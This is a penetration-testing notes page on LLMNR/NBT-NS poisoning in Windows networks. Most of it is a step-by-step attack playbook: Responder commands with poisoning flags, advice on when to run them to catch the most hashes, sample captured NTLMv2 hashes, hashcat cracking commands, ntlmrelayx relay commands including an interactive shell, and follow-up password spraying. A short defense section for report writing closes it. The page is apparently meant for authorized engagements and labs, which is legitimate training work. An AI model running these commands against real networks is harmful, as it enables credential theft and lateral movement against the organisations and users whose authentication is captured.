# LLMNR Poisoning

> These are internal network attacks that require the attacker to already be on the same network segment. Common in lab environments, assumed-breach scenarios, and red team engagements where physical or VPN access is established.

---

## What Is LLMNR?

**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are Windows protocols used as fallback name resolution when DNS fails.

When a Windows machine tries to reach a hostname and DNS can't resolve it, it broadcasts an LLMNR/NBT-NS request to the entire network segment: *"Hey, does anyone know where `FILESERVER` is?"*

Responder answers that broadcast pretending to be the host. Windows then tries to authenticate - and sends its **NTLMv2 hash** to "prove" its identity to Responder.

**Key facts:**
- LLMNR uses UDP port 5355
- NBT-NS uses UDP port 137
- Both are **on by default** in every Windows install
- Happens automatically - no user interaction, just wait for someone to mistype a share name or access a resource

---

## When to Run This

- **Morning** - users logging in, machines starting up -> most traffic
- **After lunch** - same reason
- Any time users are actively working (accessing file shares, logging in)
- Let it run **at least 30 minutes** before giving up - it's entirely passive
- The more users on the network, the faster you get hashes

---

## Attack Steps

### Step 1 - Start Responder

```sh
sudo responder -I eth0 -dPv
```

| Flag | What it does |
|---|---|
| `-I eth0` | Interface to listen on - check with `ip a` first |
| `-d` | Enable DHCP poisoning |
| `-P` | Force NTLM auth on proxy requests - captures more hashes |
| `-v` | Verbose - shows captures in real time |

Hashes appear in the terminal as they're captured. They're also saved automatically.

### Step 2 - Wait and Collect

Example output when a hash is captured:
```
[SMB] NTLMv2-SSP Client   : 10.10.10.20
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:4141414141414141:AABBCC...:0101...
```

### Step 3 - Grab the Hash from Logs

```sh
ls /usr/share/responder/logs/
# Files named: SMB-NTLMv2-SSP-<ip>.txt, HTTP-NTLMv2-<ip>.txt

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

### Step 4 - Crack the Hash

```sh
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.20.txt /usr/share/wordlists/rockyou.txt

# Show cracked results
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

`-m 5600` = NTLMv2 (not NTLM - the hash type you capture from Responder is NTLMv2)

### Step 5 - What to Do With a Cracked Hash

- Plaintext password -> spray across the domain with nxc
- Try the credentials against WinRM, RDP, SMB, anything
- Run BloodHound with the credentials
- If you can't crack it -> try SMB relay instead (see [SMB Relay](smb-relay.md))

Full Responder flag reference and relay setup: [Responder](../../tools/responder.md)

---

## Analyze Mode - Passive Recon

```sh
# Listen for LLMNR traffic without responding - no spoofing
sudo responder -I eth0 -A -v
```

> **Note:** In environments where active poisoning is restricted, analyze mode provides passive reconnaissance. This tells you LLMNR is enabled on the network, which machines are broadcasting requests, and documents the exposure - even without capturing hashes.

---

## Relaying Without Poisoning

If you obtain NTLM auth through a non-spoofing method (e.g., a web app that triggers an outbound SMB connection to you, or an LNK file attack), you can relay it:
```sh
# Relay captured NTLM auth to targets without SMB signing
sudo ntlmrelayx.py -tf targets.txt -smb2support
sudo ntlmrelayx.py -tf targets.txt -smb2support -i    # interactive shell
```
The key distinction: **you are not spoofing to capture the hash** - the hash comes to you through a legitimate trigger. Relaying it is just lateral movement.

---

## Defense (For Report Writing)

**Option 1 - Disable LLMNR (Recommended)**
Group Policy: Computer Configuration -> Administrative Templates -> Network -> DNS Client -> **Turn off multicast name resolution** -> Enabled

**Option 2 - Disable NBT-NS**
Network adapter properties -> IPv4 -> Advanced -> WINS tab -> **Disable NetBIOS over TCP/IP**

Or via registry:
```
HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\<interface-GUID>
NetbiosOptions = 2
```

**Option 3 - Network Access Control**
If you cannot disable LLMNR (legacy systems), use NAC to only allow authorized devices - reduces the attacker's ability to be present on the network segment.

**Why this matters for the report:**
LLMNR/NBT-NS poisoning is a high-finding on real engagements because it requires zero credentials and works passively against any user who makes a name resolution request. It's almost always present and almost always exploitable in corporate networks.
